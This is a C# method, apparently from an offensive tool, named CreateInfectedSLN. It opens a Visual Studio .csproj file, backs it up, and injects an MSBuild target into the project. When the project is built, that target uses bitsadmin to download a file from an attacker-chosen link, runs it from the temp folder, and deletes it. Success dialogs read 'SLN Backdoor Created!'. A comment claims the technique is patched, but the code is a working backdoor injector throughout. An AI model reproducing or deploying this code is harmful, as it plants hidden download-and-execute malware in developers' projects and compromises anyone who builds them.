
       //this is now patched!
       public void CreateInfectedSLN(string Job, string Link, string Filename)
        {
            using (var ofd = new OpenFileDialog()) 
            {
               if (ofd.ShowDialog() == DialogResult.OK)
                {
                    ofd.InitialDirectory = @"C:\";
                    ofd.Title = "Find && Select A Visual Studios Project File";
                    ofd.Filter = "Project File(*.csproj) | *.csproj | All files(*.*) | *.* ";
                    ofd.RestoreDirectory = true;

                    var projectfile = File.ReadAllText(ofd.FileName);
                    string ToolsVersion15 = "<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">";
                    string ToolsVersion14 = "<Project ToolsVersion=\"14.0\" InitialTargets=\"Clean;Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">";
                    string Project = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />";
                    string payload = $"<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\"/>^<Target Name=\"Build\">-<Exec Command=\"bitsadmin.exe /transfer {Job} {Link} %temp%\\{Filename}\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"%temp%\\{Filename}\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"del %temp%\\{Filename}\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Message Importance=\"high\" Text=\"$(ErrorCode)\"/>-</Target> ";

                    switch (File.Exists($"{ofd.FileName}.bk"))
                    {
                        case true:
                            //remove old backup and create a new one
                            File.Delete(ofd.FileName); File.Copy($"{ofd.FileName}.bk", ofd.FileName);
                            File.Delete($"{ofd.FileName}.bk"); File.Copy(ofd.FileName, $"{ofd.FileName}.bk");
                            payload = payload.Replace("^", "\n  ").Replace("-", "\n    ").Replace("+", "\n      ");
                            projectfile = projectfile.Replace(ToolsVersion15, ToolsVersion14);
                            projectfile = projectfile.Replace(Project, payload);
                            File.WriteAllText(ofd.FileName, projectfile);
                            MessageBox.Show($"SLN Backdoor Created!\nRemoved Old up & created a new one.!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                        case false:
                            //create backup and backdoor
                            File.Copy(ofd.FileName, $"{ofd.FileName}.bk");
                            payload = payload.Replace("^", "\n  ").Replace("-", "\n    ").Replace("+", "\n      ");
                            projectfile = projectfile.Replace(ToolsVersion15, ToolsVersion14);
                            projectfile = projectfile.Replace(Project, payload);
                            File.WriteAllText(ofd.FileName, projectfile);
                            MessageBox.Show($"SLN Backdoor Created & Backup made!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                    }
                }
            }
        }
